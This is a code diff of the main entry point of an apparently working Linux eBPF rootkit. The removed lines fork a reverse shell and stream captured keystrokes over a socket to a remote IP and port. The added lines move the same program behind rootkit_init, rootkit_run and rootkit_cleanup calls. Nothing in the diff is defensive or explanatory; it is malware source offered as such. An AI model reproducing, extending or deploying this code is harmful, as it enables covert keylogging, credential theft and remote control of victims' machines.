@@ -1,48 +1,34 @@
-#include <linux/types.h>
-#include <bpf/libbpf.h>
+#include "userspace/rootkit.h"
+#include <signal.h>
 #include <stdio.h>
-#include <errno.h>
-#include "userspace/rootkit_loader.h"
-#include "userspace/reverse_shell.h"
-#include "userspace/keylogger_processor.h"
-#include "userspace/hider.h"
-#include "config.h"
-#include "rootkit.skel.h"
 
-int main()
-{
-    struct rootkit *skel;
+static application_context_t g_rootkit;
 
-    skel = load_rootkit();
-    if (!skel)
-        return -EINVAL;
+static void handle_signal(int sig) {
+    (void)sig;
+    g_rootkit.running = false;
+}
 
-    pid_t reverse_shell_pid = fork();
-	if (reverse_shell_pid < 0) {
-        int err = errno;
-		perror("Fork failed");
-		return -err;
-	}
+int main(int argc, char *argv[]) {
+    (void)argc;
 
-	if (reverse_shell_pid == 0) {
-		run_reverse_shell();
-    }
+    signal(SIGINT, handle_signal);
+    signal(SIGTERM, handle_signal);
 
-    struct keylogger_ctx ctx = {
-        .keylogger_socket_fd = init_keylogger_sender_socket(REMOTE_IP, KEYLOGGER_PORT),
+    /* Reap children automatically */
+    struct sigaction sa = {
+        .sa_handler = SIG_IGN,
+        .sa_flags = SA_NOCLDWAIT,
     };
+    sigaction(SIGCHLD, &sa, NULL);
 
-    struct ring_buffer *keylog_event_rb = ring_buffer__new(bpf_map__fd(skel->maps.keylog_events), process_key_event, &ctx, NULL);
-
-    while (1) {
-
-        if (ctx.keylogger_socket_fd < 0)
-            ctx.keylogger_socket_fd = init_keylogger_sender_socket(REMOTE_IP, KEYLOGGER_PORT);
-
-        ring_buffer__poll(keylog_event_rb, 100);
+    if (rootkit_init(&g_rootkit, argv[0]) < 0) {
+        perror("Failed to initialize");
+        return 1;
     }
 
-    unload_rootkit(skel);
+    int err = rootkit_run(&g_rootkit);
 
-    return 0;
+    rootkit_cleanup(&g_rootkit);
+    return err;
 }
